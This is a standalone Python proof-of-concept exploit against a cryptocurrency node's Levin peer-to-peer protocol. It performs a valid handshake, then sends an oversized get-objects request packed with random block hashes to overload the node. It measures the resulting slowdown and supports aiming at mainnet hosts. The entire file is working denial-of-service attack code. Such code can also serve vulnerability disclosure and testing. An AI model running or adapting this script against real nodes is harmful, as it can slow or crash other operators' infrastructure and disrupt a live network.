#!/usr/bin/env python3
import socket
import struct
import os
import sys
import time

# Levin protocol constants
LEVIN_SIGNATURE = 0x0101010101012101
LEVIN_PACKET_REQUEST = 0x00000001
LEVIN_PROTOCOL_VER = 1

# Command IDs
CMD_HANDSHAKE = 1001
CMD_TIMED_SYNC = 1002
CMD_PING = 1003
CMD_REQUEST_GET_OBJECTS = 2003

# Portable storage constants
PS_SIGNATURE_A = 0x01011101
PS_SIGNATURE_B = 0x01020101
PS_FORMAT_VER = 1

# Type IDs
TYPE_INT64 = 1
TYPE_UINT64 = 5
TYPE_UINT32 = 6
TYPE_STRING = 10
TYPE_BOOL = 11
TYPE_OBJECT = 12

# network_id[10] = testnet flag (0=mainnet, 1=testnet)
# network_id[15] = CURRENCY_FORMATION_VERSION (84=mainnet, 100=testnet)
NETWORK_ID_MAINNET = bytes([
    0x11, 0x10, 0x01, 0x11, 0x01, 0x01, 0x11, 0x01,
    0x10, 0x11, 0x00, 0x11, 0x01, 0x11, 0x21, 0x54
])
NETWORK_ID_TESTNET = bytes([
    0x11, 0x10, 0x01, 0x11, 0x01, 0x01, 0x11, 0x01,
    0x10, 0x11, 0x01, 0x11, 0x01, 0x11, 0x21, 0x64
])

# mainnet: 11121
# testnet: 11211 + CURRENCY_FORMATION_VERSION(100) = 11311
PORT_MAINNET = 11121
PORT_TESTNET = 11311


def encode_varint(n):
    if n <= 63:
        return bytes([(n << 2) | 0])
    elif n <= 16383:
        return struct.pack('<H', (n << 2) | 1)
    elif n <= 1073741823:
        return struct.pack('<I', (n << 2) | 2)
    else:
        return struct.pack('<Q', (n << 2) | 3)


def decode_varint(data, offset):
    marker = data[offset] & 0x03
    if marker == 0:
        return data[offset] >> 2, offset + 1
    elif marker == 1:
        val = struct.unpack_from('<H', data, offset)[0]
        return val >> 2, offset + 2
    elif marker == 2:
        val = struct.unpack_from('<I', data, offset)[0]
        return val >> 2, offset + 4
    else:
        val = struct.unpack_from('<Q', data, offset)[0]
        return val >> 2, offset + 8


def make_ps_header():
    return struct.pack('<II', PS_SIGNATURE_A, PS_SIGNATURE_B) + bytes([PS_FORMAT_VER])


def make_entry(name, type_id, data):
    return bytes([len(name)]) + name.encode() + bytes([type_id]) + data


def make_string_entry(name, data):
    return make_entry(name, TYPE_STRING, encode_varint(len(data)) + data)


def make_uint64_entry(name, val):
    return make_entry(name, TYPE_UINT64, struct.pack('<Q', val))


def make_int64_entry(name, val):
    return make_entry(name, TYPE_INT64, struct.pack('<q', val))


def make_uint32_entry(name, val):
    return make_entry(name, TYPE_UINT32, struct.pack('<I', val))


def make_bool_entry(name, val):
    return make_entry(name, TYPE_BOOL, bytes([1 if val else 0]))


def make_object_entry(name, entries):
    obj_data = encode_varint(len(entries))
    for e in entries:
        obj_data += e
    return make_entry(name, TYPE_OBJECT, obj_data)


def make_levin_header(command, payload_size, have_return, is_request=True):
    flags = LEVIN_PACKET_REQUEST if is_request else 0x00000002
    return struct.pack('<QQBIIII',
        LEVIN_SIGNATURE,
        payload_size,
        1 if have_return else 0,
        command,
        0,
        flags,
        LEVIN_PROTOCOL_VER
    )


def build_handshake_payload(network_id):
    node_data_entries = [
        make_string_entry("network_id", network_id),
        make_uint64_entry("peer_id", struct.unpack('<Q', os.urandom(8))[0]),
        make_int64_entry("local_time", int(time.time())),
        make_uint32_entry("my_port", 0),
    ]

    payload_data_entries = [
        make_uint64_entry("current_height", 1),
        make_string_entry("top_id", b'\x00' * 32),
        make_uint64_entry("last_checkpoint_height", 0),
        make_uint64_entry("core_time", int(time.time())),
        make_string_entry("client_version", b"0.0.0.382[deadbeef]"),
        make_bool_entry("non_pruning_mode_enabled", False),
    ]

    maintrs_entries = [
        make_string_entry("maintainers_info_buff", b''),
        make_string_entry("sign", b'\x00' * 64),
    ]

    root_entries = [
        make_object_entry("node_data", node_data_entries),
        make_object_entry("payload_data", payload_data_entries),
        make_object_entry("maintrs_entry", maintrs_entries),
    ]

    payload = make_ps_header()
    payload += encode_varint(len(root_entries))
    for e in root_entries:
        payload += e

    return payload


def build_timed_sync_payload(network_id):
    payload_data_entries = [
        make_uint64_entry("current_height", 1),
        make_string_entry("top_id", b'\x00' * 32),
        make_uint64_entry("last_checkpoint_height", 0),
        make_uint64_entry("core_time", int(time.time())),
        make_string_entry("client_version", b"0.0.0.382[deadbeef]"),
        make_bool_entry("non_pruning_mode_enabled", False),
    ]

    maintrs_entries = [
        make_string_entry("maintainers_info_buff", b''),
        make_string_entry("sign", b'\x00' * 64),
    ]

    root_entries = [
        make_object_entry("payload_data", payload_data_entries),
        make_object_entry("maintrs_entry", maintrs_entries),
    ]

    payload = make_ps_header()
    payload += encode_varint(len(root_entries))
    for e in root_entries:
        payload += e

    return payload


def build_malicious_get_objects(num_hashes):
    blocks_blob = os.urandom(32 * num_hashes)

    root_entries = [
        make_string_entry("txs", b''),
        make_string_entry("blocks", blocks_blob),
    ]

    payload = make_ps_header()
    payload += encode_varint(len(root_entries))
    for e in root_entries:
        payload += e

    return payload


def send_chunked(sock, data, chunk_size=65536):
    total = len(data)
    sent = 0
    while sent < total:
        chunk = data[sent:sent + chunk_size]
        sock.sendall(chunk)
        sent += len(chunk)
    return sent


def recv_levin_response(sock, timeout=10):
    sock.settimeout(timeout)
    try:
        header = b''
        while len(header) < 33:
            chunk = sock.recv(33 - len(header))
            if not chunk:
                return None, None, None
            header += chunk

        sig, size, have_ret, cmd, ret_code, flags, proto = struct.unpack('<QQBIIII', header)

        if sig != LEVIN_SIGNATURE:
            return None, None, None

        payload = b''
        remaining = size
        while remaining > 0:
            chunk = sock.recv(min(remaining, 65536))
            if not chunk:
                break
            payload += chunk
            remaining -= len(chunk)

        return cmd, ret_code, payload
    except socket.timeout:
        return None, None, None
    except:
        return None, None, None


def parse_handshake_response(payload):
    if len(payload) < 9:
        return None

    sig_a, sig_b = struct.unpack_from('<II', payload, 0)
    if sig_a != PS_SIGNATURE_A or sig_b != PS_SIGNATURE_B:
        return None

    result = {'valid': True}

    try:
        offset = 9
        entry_count, offset = decode_varint(payload, offset)
        result['entry_count'] = entry_count
    except:
        result['valid'] = False

    return result


def check_connection_alive(sock, checks=3, interval=0.5):
    alive_count = 0
    for i in range(checks):
        try:
            sock.settimeout(0.1)
            data = sock.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)
            if len(data) > 0:
                alive_count += 1
            else:
                return False
        except BlockingIOError:
            alive_count += 1
        except socket.timeout:
            alive_count += 1
        except:
            pass

        if i < checks - 1:
            time.sleep(interval)

    return alive_count >= checks // 2 + 1


def measure_response_time(sock, network_id, timeout=30):
    sync_payload = build_timed_sync_payload(network_id)
    sync_header = make_levin_header(CMD_TIMED_SYNC, len(sync_payload), have_return=True)

    try:
        start = time.time()
        sock.sendall(sync_header + sync_payload)
        cmd, ret_code, resp = recv_levin_response(sock, timeout)
        elapsed = time.time() - start

        if cmd == CMD_TIMED_SYNC:
            return elapsed, True
        else:
            return elapsed, False
    except:
        return None, False


def do_handshake(sock, network_id, retries=3):
    for attempt in range(retries):
        if attempt > 0:
            print(f"[*] handshake retry {attempt + 1}/{retries}")
            time.sleep(1)

        try:
            hs_payload = build_handshake_payload(network_id)
            hs_header = make_levin_header(CMD_HANDSHAKE, len(hs_payload), have_return=True)
            sock.sendall(hs_header + hs_payload)

            cmd, ret_code, resp = recv_levin_response(sock, timeout=15)

            if cmd != CMD_HANDSHAKE:
                continue

            if ret_code != 0 and ret_code is not None:
                continue

            hs_data = parse_handshake_response(resp)
            if not hs_data or not hs_data.get('valid'):
                continue

            return True

        except Exception as e:
            if attempt == retries - 1:
                print(f"[-] handshake error: {e}")

    return False


def exploit(host, port, num_hashes, testnet=True, measure=True):
    network_id = NETWORK_ID_TESTNET if testnet else NETWORK_ID_MAINNET
    net_name = "testnet" if testnet else "mainnet"

    print(f"[*] target: {host}:{port} ({net_name})")
    print(f"[*] connecting")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)

    try:
        sock.connect((host, port))
    except Exception as e:
        print(f"[-] connection failed: {e}")
        return False

    print("[*] performing handshake")
    if not do_handshake(sock, network_id):
        print("[-] handshake failed")
        sock.close()
        return False

    print("[+] handshake accepted")

    baseline_time = None
    if measure:
        print("[*] measuring baseline response time")
        baseline_time, ok = measure_response_time(sock, network_id, timeout=10)
        if ok and baseline_time:
            print(f"[+] baseline: {baseline_time * 1000:.1f}ms")
        else:
            print("[!] baseline measurement failed, continuing")
            baseline_time = None

    payload_size = num_hashes * 32
    print(f"[*] building payload: {num_hashes} hashes ({payload_size} bytes)")

    mal_payload = build_malicious_get_objects(num_hashes)
    mal_header = make_levin_header(CMD_REQUEST_GET_OBJECTS, len(mal_payload), have_return=False)

    total_size = len(mal_header) + len(mal_payload)
    print(f"[*] sending NOTIFY_REQUEST_GET_OBJECTS ({total_size} bytes)")

    send_start = time.time()
    send_chunked(sock, mal_header + mal_payload)
    send_elapsed = time.time() - send_start

    print(f"[+] sent in {send_elapsed:.2f}s")

    print("[*] checking connection state")
    time.sleep(0.5)

    for i in range(3):
        alive = check_connection_alive(sock, checks=2, interval=0.3)
        status = "alive" if alive else "closed"
        print(f"    check {i + 1}: {status}")
        if not alive:
            break
        time.sleep(1)

    if measure and alive:
        print("[*] measuring post-attack response time")
        post_time, ok = measure_response_time(sock, network_id, timeout=60)

        if ok and post_time:
            print(f"[+] post-attack: {post_time * 1000:.1f}ms")

            if baseline_time:
                ratio = post_time / baseline_time
                print(f"[+] slowdown: {ratio:.1f}x")

                if ratio > 5:
                    print("[!] significant delay detected - server likely processing oversized request")
                elif ratio > 2:
                    print("[!] moderate delay detected")
        else:
            print("[!] post-attack response failed or timed out")
            print("[!] server may be overwhelmed or connection dropped async")

    print()
    print("[*] verification steps:")
    print("    1. check node log for 'Requested objects count is to big'")
    print("    2. confirm processing continued after the error")
    print("    3. monitor cpu/memory during attack")

    sock.close()
    return True


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} <host> [options]")
        print()
        print("options:")
        print("  -p PORT       port (default: 11311 testnet, 11121 mainnet)")
        print("  -n NUM        number of hashes (default: 50000)")
        print("  --mainnet     target mainnet (default: testnet)")
        print("  --no-measure  skip timing measurements")
        print()
        print("examples:")
        print(f"  {sys.argv[0]} 127.0.0.1")
        print(f"  {sys.argv[0]} 127.0.0.1 -p 11311 -n 100000")
        print(f"  {sys.argv[0]} 192.168.1.10 --mainnet")
        sys.exit(1)

    host = sys.argv[1]
    port = None
    num_hashes = 50000
    testnet = True
    measure = True

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '-p' and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == '-n' and i + 1 < len(sys.argv):
            num_hashes = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == '--mainnet':
            testnet = False
            i += 1
        elif sys.argv[i] == '--testnet':
            testnet = True
            i += 1
        elif sys.argv[i] == '--no-measure':
            measure = False
            i += 1
        else:
            i += 1

    if port is None:
        port = PORT_TESTNET if testnet else PORT_MAINNET

    exploit(host, port, num_hashes, testnet, measure)


if __name__ == "__main__":
    main()
